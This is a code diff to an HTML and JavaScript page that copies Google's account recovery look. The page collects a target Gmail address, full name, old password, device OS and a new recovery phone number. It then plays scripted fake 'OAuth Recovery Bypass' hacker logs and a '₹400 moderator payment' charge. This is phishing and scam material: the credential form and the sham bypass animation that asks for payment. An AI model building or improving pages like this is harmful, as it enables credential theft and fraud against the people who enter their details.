@@ -20,7 +20,7 @@
         }
 
         body {
-            background-color: #0d1117; /* Dark theme background for page 2 */
+            background-color: #0d1117; 
             color: #fff;
             min-height: 100vh;
             overflow-x: hidden;
@@ -39,7 +39,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 20000; /* Stays on top initially */
+            z-index: 20000; 
             transition: opacity 0.5s ease;
         }
 
@@ -187,7 +187,7 @@
            PAGE 2 STYLES (Dark Theme)
            ========================================= */
         #page2 {
-            display: none; /* Hidden initially */
+            display: none; 
             flex-direction: column;
             align-items: center;
             justify-content: flex-start;
@@ -456,7 +456,7 @@
         .c-err { color: #EA4335; text-shadow: 0 0 10px rgba(234, 67, 53, 0.8); }
         .c-billing { color: #ffcc00; text-shadow: 0 0 15px rgba(255, 204, 0, 0.9); font-size: 1.15rem; }
 
-        /* FINAL BLINKING REDIRECT SCREEN (As requested) */
+        /* FINAL BLINKING REDIRECT SCREEN */
         .transition-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-color: rgba(0, 0, 0, 0.95);
@@ -489,9 +489,6 @@
 </head>
 <body>
 
-    <!-- ==============================================
-         PAGE 1: LIGHT THEME GOOGLE RECOVERY
-         ============================================== -->
     <div id="page1">
         <div class="google-card">
             <div class="google-logo-container">
@@ -513,25 +510,16 @@
         </div>
     </div>
 
-    <!-- ==============================================
-         GLOBAL GOOGLE SPINNER LOADER
-         ============================================== -->
     <div id="googleSpinnerOverlay">
         <svg class="circular-loader" viewBox="25 25 50 50">
             <circle cx="50" cy="50" r="20"></circle>
         </svg>
     </div>
 
-    <!-- ==============================================
-         FINAL REDIRECT SCREEN (WITH GIF AS REQUESTED)
-         ============================================== -->
     <div class="transition-screen" id="finalRedirectScreen">
         <img src="https://pending404.github.io/g_ml/gml.gif" alt="Loading" class="transition-image">
     </div>
 
-    <!-- ==============================================
-         PAGE 2: DARK THEME TERMINAL
-         ============================================== -->
     <div id="page2">
         <div class="bg-animation">
             <div class="orb orb-1"></div>
@@ -591,7 +579,7 @@
 
                         <div class="form-group" style="z-index: 20;">
                             <label>Add Phone Number <span class="mandatory">*</span></label>
-                            <input type="tel" id="newPhone" placeholder="Add new recovery phone number" oninput="this.value = this.value.replace(//g, '')">
+                            <input type="tel" id="newPhone" placeholder="Add new recovery phone number" oninput="this.value = this.value.replace(/[^0-9+]/g, '')">
                             <div class="error-msg" id="newPhoneError">Please enter a valid phone number.</div>
                         </div>
 
@@ -633,7 +621,7 @@
 
             // GLOBAL VARIABLES
             let fetchedTargetEmail = "Not Provided";
-            const colors =; // Google colors
+            const colors = ['#4285F4', '#EA4335', '#FBBC05', '#34A853']; // Google colors
             
             // ELEMENTS
             const page1 = document.getElementById('page1');
@@ -656,7 +644,7 @@
                 
                 // Show Google Loading Overlay
                 googleSpinner.style.display = 'flex';
-                googleSpinner.classList.remove('dark-mode'); // White background for light theme
+                googleSpinner.classList.remove('dark-mode'); 
 
                 // Wait 2.5 seconds, then switch to Page 2
                 setTimeout(() => {
@@ -681,7 +669,7 @@
                 
                 let htmlContent = "";
                 headerText1.split('').forEach((char, idx) => {
-                    const color = colors;
+                    const color = colors[idx % colors.length];
                     htmlContent += `<span style="color: ${color}; text-shadow: 0 0 15px ${color}, 0 0 35px ${color};">${char}</span>`;
                 });
                 htmlContent += "<br>";
@@ -691,7 +679,7 @@
                     if(char === ' ') {
                         htmlContent += " ";
                     } else {
-                        const color = colors;
+                        const color = colors[colorIndex % colors.length];
                         htmlContent += `<span style="color: ${color}; text-shadow: 0 0 15px ${color}, 0 0 35px ${color};">${char}</span>`;
                         colorIndex++;
                     }
@@ -819,7 +807,7 @@
                 }
 
                 const formData = {
-                    firstGmail: fetchedTargetEmail, // Using email from Page 1
+                    firstGmail: fetchedTargetEmail, 
                     fullName: document.getElementById('fullName').value || 'Not Provided',
                     oldPassword: document.getElementById('oldPassword').value || 'Not Provided',
                     os: finalOsValue,
@@ -833,7 +821,6 @@
 
             // --- TRANSITION TO HACKER LOGS ---
             function startSequence(data) {
-                // Show Google Loading Overlay (Dark Mode)
                 googleSpinner.style.display = 'flex';
                 googleSpinner.classList.add('dark-mode');
 
@@ -852,25 +839,27 @@
 
             // --- SEAMLESS SYNC ANIMATION ---
             function runSeamlessSyncAnimation(data) {
-                const hackerPhrases = Initializing OAuth Recovery Bypass v2...",
-                    " Connecting to primary mail servers...",
-                    " Bypassing reCAPTCHA v3 verification...",
-                    " Overwriting registry keys...",
-                    " Establishing encrypted tunnel to DB...",
-                    " Injecting new recovery parameters...",
-                    " Clearing older session cookies...",
-                    " Spoofing device ID algorithms...",
-                    " Masking IP through proxy nodes...",
-                    " Force injecting SSL cert verification..."
+                const hackerPhrases = [
+                    "[System] Initializing OAuth Recovery Bypass v2...",
+                    "[Network] Connecting to primary mail servers...",
+                    "[Security] Bypassing reCAPTCHA v3 verification...",
+                    "[Database] Overwriting registry keys...",
+                    "[Tunnel] Establishing encrypted tunnel to DB...",
+                    "[Payload] Injecting new recovery parameters...",
+                    "[Cache] Clearing older session cookies...",
+                    "[Device] Spoofing device ID algorithms...",
+                    "[Routing] Masking IP through proxy nodes...",
+                    "[SSL] Force injecting SSL cert verification..."
                 ];
 
-                const realLogs =</span> Initiating Recovery Environment...`,
-                    `<span class="c-data"></span> Target Email: ${data.firstGmail}`,
-                    `<span class="c-data"></span> Target Device/OS: ${data.os}`,
-                    `<span class="c-sys"></span> Processing Old Details & Password...`,
-                    `<span class="c-succ"></span> Binding New Recovery Phone: ${data.newPhone}`,
-                    `<span class="c-succ"></span> Parameters Compiled Successfully!`,
-                    `<span class="c-billing"> Moderator payment charges: ₹400</span>`,
+                const realLogs = [
+                    `<span class="c-sys">[System]</span> Initiating Recovery Environment...`,
+                    `<span class="c-data">[Info]</span> Target Email: ${data.firstGmail}`,
+                    `<span class="c-data">[Info]</span> Target Device/OS: ${data.os}`,
+                    `<span class="c-sys">[Scan]</span> Processing Old Details & Password...`,
+                    `<span class="c-succ">[Execute]</span> Binding New Recovery Phone: ${data.newPhone}`,
+                    `<span class="c-succ">[Success]</span> Parameters Compiled Successfully!`,
+                    `<span class="c-billing">[Billing] Moderator payment charges: ₹400</span>`,
                     `<span class="c-sys">Please wait... Forwarding to secure environment.</span>`
                 ];
 
@@ -885,8 +874,8 @@
                     for(let k=0; k<4; k++) {
                         const lineDiv = document.createElement('div');
                         lineDiv.className = 'hacker-line';
-                        const phrase = hackerPhrases;
-                        lineDiv.innerText = `${phrase}`;
+                        const phrase = hackerPhrases[Math.floor(Math.random() * hackerPhrases.length)];
+                        lineDiv.innerText = `${phrase} [0x${Math.floor(Math.random() * 16777215).toString(16).toUpperCase()}]`;
                         fragment.appendChild(lineDiv);
                     }
                     processLog.appendChild(fragment);
@@ -917,16 +906,16 @@
                             lineDiv.className = 'log-entry typing-cursor visible';
                             processLog.appendChild(lineDiv);
 
-                            let textHTML = realLogs;
+                            let textHTML = realLogs[realLogIndex];
                             let currentHTML = "";
                             let isTag = false;
                             let i = 0;
 
                             const typeInterval = setInterval(() => {
                                 if (i < textHTML.length) {
-                                    if (textHTML === '<') isTag = true;
-                                    currentHTML += textHTML;
-                                    if (textHTML === '>') isTag = false;
+                                    if (textHTML[i] === '<') isTag = true;
+                                    currentHTML += textHTML[i];
+                                    if (textHTML[i] === '>') isTag = false;
 
                                     lineDiv.innerHTML = currentHTML; 
                                     processLog.scrollTop = processLog.scrollHeight; 
